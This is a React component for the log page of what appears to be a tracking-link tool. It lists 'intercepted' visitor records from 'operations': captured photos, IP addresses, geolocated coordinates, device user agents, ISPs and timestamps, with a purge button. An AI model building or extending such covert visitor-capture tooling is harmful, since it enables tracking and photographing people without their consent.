import { useListLogs, useDeleteLog, getListLogsQueryKey } from "@workspace/api-client-react";
import { useQueryClient } from "@tanstack/react-query";
import { Card } from "@/components/ui/card";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { MapPin, Globe, Laptop, Clock, Camera, Trash2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { Link } from "wouter";

export default function Logs() {
  const { data: logs, isLoading } = useListLogs();
  const deleteLog = useDeleteLog();
  const queryClient = useQueryClient();
  const { toast } = useToast();

  const handleDelete = (id: number) => {
    if (!confirm("Purge this log entry permanently?")) return;
    deleteLog.mutate(
      { id },
      {
        onSuccess: () => {
          queryClient.invalidateQueries({ queryKey: getListLogsQueryKey() });
          toast({
            title: "LOG PURGED",
            description: "Entry deleted from database.",
          });
        }
      }
    );
  };

  return (
    <div className="space-y-8 animate-in fade-in duration-500">
      <div className="flex justify-between items-end border-b border-border pb-4">
        <div>
          <h1 className="text-2xl font-bold tracking-widest text-primary uppercase">Global Intel Logs</h1>
          <p className="text-muted-foreground text-sm mt-1 uppercase tracking-wider">All intercepted data across all operations</p>
        </div>
      </div>

      <Card className="bg-card border-border rounded-sm overflow-hidden">
        <div className="overflow-x-auto">
          <Table>
            <TableHeader className="bg-secondary/50">
              <TableRow className="border-border hover:bg-transparent">
                <TableHead className="w-16 text-muted-foreground uppercase tracking-wider text-xs">IMG</TableHead>
                <TableHead className="text-muted-foreground uppercase tracking-wider text-xs">Operation</TableHead>
                <TableHead className="text-muted-foreground uppercase tracking-wider text-xs">IP / Location</TableHead>
                <TableHead className="text-muted-foreground uppercase tracking-wider text-xs">Device Info</TableHead>
                <TableHead className="text-muted-foreground uppercase tracking-wider text-xs text-right">Time</TableHead>
                <TableHead className="w-12"></TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {isLoading ? (
                <TableRow className="border-border">
                  <TableCell colSpan={6} className="h-32 text-center text-primary animate-pulse tracking-widest uppercase">
                    SCANNING DATABASE...
                  </TableCell>
                </TableRow>
              ) : logs?.length === 0 ? (
                <TableRow className="border-border hover:bg-transparent">
                  <TableCell colSpan={6} className="h-32 text-center text-muted-foreground uppercase tracking-widest">
                    Database empty
                  </TableCell>
                </TableRow>
              ) : (
                logs?.map((log) => (
                  <TableRow key={log.id} className="border-border border-b hover:bg-secondary/30 transition-colors group">
                    <TableCell className="p-4">
                      <div className="w-12 h-12 bg-secondary border border-border rounded-sm overflow-hidden flex items-center justify-center relative">
                        {log.photo ? (
                          <img src={log.photo} alt="Capture" className="w-full h-full object-cover group-hover:scale-110 transition-transform" />
                        ) : (
                          <Camera className="w-4 h-4 text-muted-foreground opacity-50" />
                        )}
                        <div className="absolute inset-0 bg-primary/20 opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none" />
                      </div>
                    </TableCell>
                    <TableCell className="font-mono text-xs">
                      <Link href={`/links/${log.linkId}`} className="text-primary hover:underline font-bold uppercase block truncate max-w-[150px]">
                        {log.linkName || `LINK_${log.linkId}`}
                      </Link>
                    </TableCell>
                    <TableCell className="font-mono">
                      <div className="font-bold text-foreground mb-1">{log.ip}</div>
                      <div className="text-xs text-muted-foreground flex items-center gap-1 truncate max-w-[200px]">
                        <MapPin className="w-3 h-3" />
                        {log.city ? `${log.city}, ${log.country}` : "Unknown Location"}
                        {log.lat && log.lon && <span className="text-primary/50 ml-1">[{log.lat.toFixed(2)}, {log.lon.toFixed(2)}]</span>}
                      </div>
                    </TableCell>
                    <TableCell className="font-mono text-xs">
                      <div className="flex items-center gap-1 text-muted-foreground mb-1 truncate max-w-[250px]" title={log.userAgent || ""}>
                        <Laptop className="w-3 h-3 min-w-3" />
                        <span className="truncate">{log.userAgent || "Unknown Device"}</span>
                      </div>
                      <div className="flex items-center gap-1 text-muted-foreground">
                        <Globe className="w-3 h-3" />
                        {log.isp || log.org || "Unknown ISP"}
                      </div>
                    </TableCell>
                    <TableCell className="text-right font-mono text-xs text-muted-foreground">
                      <div className="flex flex-col items-end gap-1">
                        <span className="flex items-center gap-1"><Clock className="w-3 h-3" /> {new Date(log.createdAt).toLocaleDateString()}</span>
                        <span>{new Date(log.createdAt).toLocaleTimeString()}</span>
                      </div>
                    </TableCell>
                    <TableCell>
                      <Button 
                        variant="ghost" 
                        size="icon" 
                        className="h-8 w-8 text-muted-foreground hover:text-destructive hover:bg-destructive/10 rounded-sm opacity-0 group-hover:opacity-100 transition-opacity"
                        onClick={() => handleDelete(log.id)}
                        title="Purge Log"
                      >
                        <Trash2 className="w-4 h-4" />
                      </Button>
                    </TableCell>
                  </TableRow>
                ))
              )}
            </TableBody>
          </Table>
        </div>
      </Card>
    </div>
  );
}